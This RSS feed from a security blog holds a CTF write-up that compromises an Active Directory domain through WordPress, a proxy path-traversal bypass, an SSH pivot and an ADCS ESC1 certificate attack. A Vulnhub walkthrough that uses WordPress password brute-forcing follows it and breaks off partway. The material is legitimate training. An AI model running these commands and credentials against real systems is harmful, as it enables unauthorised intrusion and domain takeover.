<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>WPScan on</title><link>https://blog.ikuamike.io/tags/wpscan/</link><description>Recent content in WPScan on</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 17 Nov 2024 02:10:36 +0300</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/wpscan/index.xml" rel="self" type="application/rss+xml"/><item><title>P3RF3CT R00T CTF 2024 Writeup - Active Directory</title><link>https://blog.ikuamike.io/posts/2024/p3rf3ctr00t_ctf_2024_ad/</link><pubDate>Sun, 17 Nov 2024 02:10:36 +0300</pubDate><guid>https://blog.ikuamike.io/posts/2024/p3rf3ctr00t_ctf_2024_ad/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/ctf_logo.jpg" class="center" style="border-radius: 8px;" />
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>This weekend I had some fun participating in the P3RF3CTR00T CTF 2024 by &lt;a href="https://twitter.com/p3rf3ctr00t" target="_blank" rel="noopener">p3rf3ctr00t&lt;/a>
ctf team, barely got some sleep. They really did a good job considering it&amp;rsquo;s their first edition of the CTF, I didn&amp;rsquo;t experience any downtime and support was very helpful on their discord server. They had over 50 challenges!&lt;/p>
&lt;p>Kudos to them, I am happy to see an evolution of CTFs in the Kenyan hacking scene. I have been playing CTFs for a while and this one gave me a fun challenge, at some point I was number 1. I was playing solo under &lt;strong>NoPwnNoGain&lt;/strong>.&lt;/p>
&lt;p>Alright, let&amp;rsquo;s get into the writeup. The AD category was a challenge to everyone, even after 24 hrs I was the only solver. Later, on there were additional solves but no one else got DA :).&lt;/p>
&lt;h2 id="attack">Attack&lt;/h2>
&lt;p>We start of with the challenge information. Important info here is the IP and the Artifact.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_1.png" class="center" style="border-radius: 8px;" />
&lt;p>We begin by running a full portscan on the target.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_2.png" class="center" style="border-radius: 8px;" />
&lt;p>We only get port 22 and 80 open, on port 80 we have a Wordpress site.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_3.png" class="center" style="border-radius: 8px;" />
&lt;p>I fired up wpscan, to get recon going as I clicked around the site to see what was posted.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wpscan --url http://154.12.228.253/ -e ap,at,tt,cb,dbe,u --api-token --redacted-- -o wpscan.out
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From the scan, the only notable finding was the discovered user, we could also see the username on the site from a published post.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_4.png" class="center" style="border-radius: 8px;" />
&lt;p>After recon, the only logical next step was to target this user. Remember the &lt;strong>Artifact - Winterseason1234&lt;/strong> from the challenge info? Let&amp;rsquo;s test it as the password for this account.&lt;/p>
&lt;p>Unfortunately, when we try accessing /wp-admin we are forbidden. Based on the output, there&amp;rsquo;s a proxy blocking this access.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_5.png" class="center" style="border-radius: 8px;" />
&lt;p>So how do we test the credentials? Since I remember xmlrpc was accessible based on the wpscan output, I used metasploit&amp;rsquo;s &lt;code>wordpress_xmlrpc_login&lt;/code> module to check if the password is valid.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_6.png" class="center" style="border-radius: 8px;" />
&lt;p>Now that we confirm the password is valid, what next? We can&amp;rsquo;t access wp-admin.&lt;/p>
&lt;p>I got stuck here for some time doing various things against wordpress, I tried scanning again to see if I missed anything. I tried using xmlrpc to make modifications on the site but it has very limited functionality. Without much success, I decided that finding a bypass so as to access wp-admin was the only way forward.&lt;/p>
&lt;p>I tried several bypasses such as adding X-Forwared-For headers but no dice. Finally a little trickery with the URL worked.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_7.png" class="center" style="border-radius: 8px;" />
&lt;p>By using path traversal, I was able to bypass the proxy and get to Wordpress. As you can see we no longer get 403 Forbidden.&lt;/p>
&lt;p>The next step is to make sure I can comfortably do this on the browser. Burp&amp;rsquo;s Match and Replace for the win.&lt;/p>
&lt;p>I added the following rule that ensures, whenever I use &lt;code>/wp-admin&lt;/code> on the browser, Burp would replace it with &lt;code>/wp-content/../wp-admin&lt;/code> and forward it to the server.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_8.png" class="center" style="border-radius: 8px;" />
&lt;p>To make things smoother, I did the same for wp-login.php as well.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_9.png" class="center" style="border-radius: 8px;" />
&lt;p>Now we can comfortably login to wp-admin.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_10.png" class="center" style="border-radius: 8px;" />
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_11.png" class="center" style="border-radius: 8px;" />
&lt;p>With access to the admin panel, getting a shell is straighforward. We can modify one of the theme files to include our php shell payload. I initially did this, but later realized I had skipped the intended path. So let&amp;rsquo;s follow the intended path (which is easier).&lt;/p>
&lt;h3 id="wordstress-flag">WordStress Flag&lt;/h3>
&lt;p>In the comments, there&amp;rsquo;s one comment that is in the trash. This includes the WordStress flag and the password to crocodile on the host.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_12.png" class="center" style="border-radius: 8px;" />
&lt;p>WordStress Flag: &lt;code>r00t{well_lif3_1s_T00_h4rD_w1d_p0xies_pixies}&lt;/code>&lt;/p>
&lt;p>We can now comfortably ssh into the box. The important bit, was to ensure we specify the domain. This was not a local user but a user on Active Directory.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_13.png" class="center" style="border-radius: 8px;" />
&lt;p>This was easier for me since I initially got access to the box via a reverse shell and discovered the domain name.&lt;/p>
&lt;p>I would imagine, it wouldn&amp;rsquo;t have been so intuitive to provide the domain name on the first try. Even though on the comment we are given some sort of hint, I bet it wouldn&amp;rsquo;t have been a quick thing to figure out.&lt;/p>
&lt;h3 id="calm-belt-flag">Calm Belt Flag&lt;/h3>
&lt;p>Once logged in we have access to the next flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_14.png" class="center" style="border-radius: 8px;" />
&lt;p>Flag: &lt;code>r00t{Th3_calm_b3lt_isnt_s0_calm}&lt;/code>&lt;/p>
&lt;p>After some local recon, the next step seemed to point to attacking Active Directory no need for privesc to root.&lt;/p>
&lt;p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_15.png" class="center" style="border-radius: 8px;" />
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_16.png" class="center" style="border-radius: 8px;" />
&lt;/p>
&lt;p>We now have the IP of what could be Domain Controller as that&amp;rsquo;s where our DNS is pointed to. I&amp;rsquo;ll use this linux box to proxy traffic to the DC and attack directly from my local kali machine.&lt;/p>
&lt;p>Let&amp;rsquo;s setup a socks proxy over SSH.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh -D &lt;span style="color:#ae81ff">1080&lt;/span> &lt;span style="color:#e6db74">&amp;#39;crocodile@grandline.local&amp;#39;&lt;/span>@154.12.228.253
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I&amp;rsquo;ll point my proxychains config to 127.0.0.1 1080 and everything is all set. I&amp;rsquo;ll begin by using netexec as it has a lot of good features built-in.&lt;/p>
&lt;p>I am able to confirm that the IP we have is indeed for the domain controller and the credentials for the crocodile user are valid for the domain.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_17.png" class="center" style="border-radius: 8px;" />
&lt;p>Now let&amp;rsquo;s do some more recon on the domain.&lt;/p>
&lt;h4 id="domain-users">Domain Users:&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q netexec smb 94.72.112.254 -u crocodile -p &lt;span style="color:#e6db74">&amp;#39;Cr0c0d1le_tears_lol1234&amp;#39;&lt;/span> --users
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>There were many users present, but since the password for most of them were set in the same minute. I chose to consider only a few who were interesting and had different password set times meaning they could have some significance in the challenge.&lt;/p>
&lt;ol>
&lt;li>Administrator&lt;/li>
&lt;li>krbtgt&lt;/li>
&lt;li>sanji&lt;/li>
&lt;li>crocodile&lt;/li>
&lt;li>koala&lt;/li>
&lt;/ol>
&lt;p>The user sanji is also present in the linux box.&lt;/p>
&lt;h4 id="domain-computers">Domain Computers:&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q netexec smb 94.72.112.254 -u crocodile -p &lt;span style="color:#e6db74">&amp;#39;Cr0c0d1le_tears_lol1234&amp;#39;&lt;/span> --computers
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Only two are present.&lt;/p>
&lt;ol>
&lt;li>\calmbelt$ (our Linux box)&lt;/li>
&lt;li>grandline.local\DC$ (the DC)&lt;/li>
&lt;/ol>
&lt;h4 id="network-shares">Network Shares&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q netexec smb 94.72.112.254 -u crocodile -p &lt;span style="color:#e6db74">&amp;#39;Cr0c0d1le_tears_lol1234&amp;#39;&lt;/span> --shares
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>One of the network shares was interesting to me, since it&amp;rsquo;s not usually present by default. This signalled to me that we have ADCS configured and it could potentially be our attack vector.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_18.png" class="center" style="border-radius: 8px;" />
&lt;h4 id="bloudhound">BloudHound&lt;/h4>
&lt;p>Netexec also has the option to collect data for use in bloodhound.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q netexec ldap 94.72.112.254 -u crocodile -p &lt;span style="color:#e6db74">&amp;#39;Cr0c0d1le_tears_lol1234&amp;#39;&lt;/span> --bloodhound --dns-server 94.72.112.254 -c All
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_19.png" class="center" style="border-radius: 8px;" />
&lt;p>In bloodhound, when we look at the information about the interesting users we previously got. Sanji seems to have additional privileges on the Domain. He is part of the &lt;code>Remote Management Users&lt;/code> group.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_20.png" class="center" style="border-radius: 8px;" />
&lt;p>This means, we may need to first get access as sanji. I remembered that during my local recon on the linux box there was a ccache file for sanji in /tmp.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_21.png" class="center" style="border-radius: 8px;" />
&lt;p>After downloading the file to my local machine, I imported the ccache file and could now use it for kerberos authentication auth as sanji. For netexec we need to specify &lt;code>--use-kcache&lt;/code>.&lt;/p>
&lt;p>proxychains -q netexec smb 94.72.112.254 &amp;ndash;use-kcache&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_22.png" class="center" style="border-radius: 8px;" />
&lt;p>At this point, this was well and good but I still couldn&amp;rsquo;t use this access to connect to the DC. So I switched to trying out ADCS. Since we noted it was present when we did recon on the available shares.&lt;/p>
&lt;p>I used certipy and specified -old-bloodhound, so I can import the results into the bloodhound.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q certipy find -u crocodile@grandline.local -p &lt;span style="color:#e6db74">&amp;#39;Cr0c0d1le_tears_lol1234&amp;#39;&lt;/span> -dc-ip 94.72.112.254 -old-bloodhound
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_23.png" class="center" style="border-radius: 8px;" />
&lt;p>From Bloodhound, we can see that we have 2 certificates that we can use for ESC1 attack.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_24.png" class="center" style="border-radius: 8px;" />
&lt;p>If we checked from our owned principals, we see that we can use sanji to abuse this.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_25.png" class="center" style="border-radius: 8px;" />
&lt;p>From certipy output (if you don&amp;rsquo;t provide the -old-bloodhound option), we can confirm that sanji has rights on this certificate. This is also the challenge name, so it was a no brainer this was the intended path.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_26.png" class="center" style="border-radius: 8px;" />
&lt;h3 id="marinford-degree-flag">Marinford Degree Flag&lt;/h3>
&lt;p>Now we can exploit this and get administrator access and access the flag.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q certipy req -k -ca grandline-DC-CA -target dc.grandline.local -template Marinford_Degree -upn administrator@grandline.local -dns-tcp -dc-ip 94.72.112.254
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_27.png" class="center" style="border-radius: 8px;" />
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q certipy auth -pfx administrator_dc.pfx -dc-ip 94.72.112.254
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_28.png" class="center" style="border-radius: 8px;" />
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q certipy auth -pfx administrator_dc.pfx -dc-ip 94.72.112.254
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_29.png" class="center" style="border-radius: 8px;" />
&lt;p>Flag: &lt;code>r00t{C3rtificate_f0r_grandline_wh4t_a_j0ke_I_can_for9e}&lt;/code>&lt;/p>
&lt;h2 id="extras">Extras&lt;/h2>
&lt;p>After finishing the CTF, I got this idea. Since I was playing around with xmlrpc, could we have just accessed the comment in trash using xmlrpc? Then we don&amp;rsquo;t need to struggle with the 403 bypass. Even though xmlrpc functionality is limited. It can pretty much read most of the things on wordpress.&lt;/p>
&lt;p>ChatGPT for the win. ChatGPT wrote for me this python script that I could use to read the hidden comment and flag. Awesome!&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> xmlrpc.client
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># WordPress site XML-RPC URL&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wp_url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://154.12.228.253/xmlrpc.php&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># WordPress login credentials&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wp_username &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;crocodile&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wp_password &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Winterseason1234&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Create the XML-RPC client&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>client &lt;span style="color:#f92672">=&lt;/span> xmlrpc&lt;span style="color:#f92672">.&lt;/span>client&lt;span style="color:#f92672">.&lt;/span>ServerProxy(wp_url)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Define the parameters to get comments in the trash&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>comment_filter &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;status&amp;#39;&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;trash&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># Filter comments with status &amp;#39;trash&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Call the wp.getComments method&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> comments &lt;span style="color:#f92672">=&lt;/span> client&lt;span style="color:#f92672">.&lt;/span>wp&lt;span style="color:#f92672">.&lt;/span>getComments(&lt;span style="color:#ae81ff">0&lt;/span>, wp_username, wp_password, comment_filter)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Check if any comments are found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> comments:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Comments in Trash:&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> comment &lt;span style="color:#f92672">in&lt;/span> comments:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;ID: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;comment_id&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Post ID: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;post_id&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Author: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;author&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Content: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;content&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Date: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;date_created_gmt&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;-&amp;#34;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">40&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;No comments found in the trash.&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">except&lt;/span> xmlrpc&lt;span style="color:#f92672">.&lt;/span>client&lt;span style="color:#f92672">.&lt;/span>Fault &lt;span style="color:#66d9ef">as&lt;/span> e:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Error occurred: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>e&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_30.png" class="center" style="border-radius: 8px;" />
&lt;p>During the CTF, it definitely wouldn&amp;rsquo;t have been the first thing to try, but still interesting to see that it works.&lt;/p>
&lt;p>I&amp;rsquo;m not sure the author knew this was possible. This is a clear indication that blocking access to the wp-admin portal doesn&amp;rsquo;t really fully protect the wordpress instance, xmlrpc has some useful functionality! This is if you have valid credentials. Most online resources around attacking wordpress using xmlrpc don&amp;rsquo;t really cover this.&lt;/p>
&lt;p>There is potential to write an script that goes through xmlrpc and dumps various info if wp-admin is blocked. I hope you the reader can look into it. I surely will.&lt;/p>
&lt;p>It tried using wp-json as well but I didn&amp;rsquo;t succeed.&lt;/p>
&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>This was good challenge, cheers to the author &lt;a href="https://x.com/byronchris25" target="_blank" rel="noopener">Winter&lt;/a>
. Thanks for reading to the end!&lt;/p></content></item><item><title>Vulnhub: Lemon Squeezy 1</title><link>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</link><pubDate>Tue, 13 Apr 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon.png" class="center" style="border-radius: 8px;" />
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Difficulty&lt;/th>
&lt;th>Release Date&lt;/th>
&lt;th>Author&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Beginner&lt;/td>
&lt;td>26 Apr 2020&lt;/td>
&lt;td>James Hay&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>For this box we only get one port running a web server and we discover wordpress and phpmyadmin by directory bruteforcing.
On the wordpress application we bruteforce credentials of the users discovered and then discover more credentials stored
in a draft post. With this new credentials we access phpmyadmin and write to a file using an sql query. This serves
as our initial foothold and we then escalate privileges by abusing a cron job running as root that executes a world writeable
script.&lt;/p>
&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
&lt;p>Nmap&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.134
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.00014s latency&lt;span style="color:#f92672">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.25 &lt;span style="color:#f92672">((&lt;/span>Debian&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.25 &lt;span style="color:#f92672">(&lt;/span>Debian&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Apache2 Debian Default Page: It works
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MAC Address: 00:0C:29:FF:26:DE &lt;span style="color:#f92672">(&lt;/span>VMware&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
&lt;h2 id="80-http">80 (HTTP)&lt;/h2>
&lt;p>Visiting this page on the browser only serves the apache default page, confirming what nmap found in title.&lt;/p>
&lt;p>After performing a directory bruteforce using ffuf we get the following directories:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ffuf -ic -c -u &lt;span style="color:#e6db74">&amp;#39;http://192.168.191.134/FUZZ&amp;#39;&lt;/span> -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t &lt;span style="color:#ae81ff">50&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-1.png" class="center" style="border-radius: 8px;" />
&lt;p>Checking the /wordpress directory, we see a basic wordpress site with not much information.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-2.png" class="center" style="border-radius: 8px;" />
&lt;p>Performing enumeration using wpscan, the only interesting information gathered is the usernames.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wpscan --url http://lemonsqueezy/wordpress -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-3.png" class="center" style="border-radius: 8px;" />
&lt;p>Bruteforcing the credentials for each user, we discover the password of the orange user.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wpscan --url http://lemonsqueezy/wordpress -U orange -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-4.png" class="center" style="border-radius: 8px;" />
